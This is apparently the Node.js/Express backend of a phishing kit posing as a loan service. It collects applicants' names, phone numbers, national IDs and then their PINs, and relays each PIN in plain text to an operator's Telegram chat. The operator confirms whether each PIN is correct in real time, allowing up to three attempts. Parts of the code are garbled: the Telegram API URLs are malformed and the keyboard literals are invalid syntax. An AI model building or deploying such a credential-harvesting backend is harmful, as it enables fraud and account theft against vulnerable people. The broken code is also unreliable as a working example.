const express = require("express");
const axios = require("axios");
const path = require("path");

const app = express();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// ENV VARIABLES
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

// ✅ STORE USERS
const users = {};

// ================= HOME =================
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// ================= 1. INITIAL APPLICATION =================
app.post("/apply", async (req, res) => {
  const { name, phone, network, amount, nationalId } = req.body;

  if (!phone) return res.status(400).send("Phone is required");

  // Reset or create user record
  users[phone] = {
    name: name || "Unknown",
    phone,
    network: network || "Unknown",
    amount: amount || "0",
    nationalId: nationalId || "N/A",
    status: "pending",
    pinStatus: "waiting",
    attempts: 0
  };

  const message = `📥 *NEW LOAN APPLICATION*\n\n👤 *Name:* ${users[phone].name}\n📱 *Phone:* ${phone}\n💰 *Amount:* ${users[phone].amount}\n\n⚙️ *Action Required:*`;

  try {
    await axios.post(`https://telegram.org{BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard:]
      }
    });
    res.sendStatus(200);
  } catch (err) {
    res.status(500).send("Telegram failed");
  }
});

// ================= 2. STATUS CHECKERS =================
app.get("/status/:phone", (req, res) => {
  const phone = req.params.phone;
  res.json({ status: users[phone]?.status || "unknown" });
});

app.get("/check-pin-status/:phone", (req, res) => {
  const phone = req.params.phone;
  const user = users[phone];
  if (!user) return res.json({ status: "unknown" });
  res.json({ status: user.pinStatus, attempt: user.attempts });
});

// ================= 3. PIN SUBMISSION =================
app.post("/send-pin", async (req, res) => {
  const { phone, pin } = req.body;
  if (!users[phone]) return res.sendStatus(404);

  users[phone].attempts += 1;
  users[phone].pinStatus = "verifying";

  const message = `🔐 *PIN RECEIVED (${users[phone].attempts}/3)*\n\n📱 *Phone:* ${phone}\n🔑 *PIN:* \`${pin}\``;

  try {
    await axios.post(`https://telegram.org{BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard:]
      }
    });
    res.sendStatus(200);
  } catch (err) {
    res.sendStatus(500);
  }
});

// ================= 4. WEBHOOK (RE-FIXED) =================
app.post("/webhook", (req, res) => {
  const data = req.body;
  if (!data.callback_query) return res.sendStatus(200);

  const action = data.callback_query.data;
  
  // Safely extract command and phone
  const parts = action.split("_");
  const command = parts[0];
  const phone = parts[1];

  if (!users[phone]) return res.sendStatus(200);

  let feedback = "";

  if (command === "approve") {
    users[phone].status = "approved";
    feedback = `✅ Approved ${phone}`;
  } else if (command === "decline") {
    users[phone].status = "declined";
    feedback = `❌ Declined ${phone}`;
  } else if (command === "pinok") {
    users[phone].pinStatus = "success";
    feedback = `✅ PIN Correct for ${phone}`;
  } else if (command === "pinwrong") {
    users[phone].pinStatus = "re-enter";
    feedback = `⚠️ Wrong PIN for ${phone}`;
  }

  axios.post(`https://telegram.org{BOT_TOKEN}/sendMessage`, {
    chat_id: CHAT_ID,
    text: feedback
  });

  res.sendStatus(200);
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, "0.0.0.0", () => console.log("Server running on " + PORT));
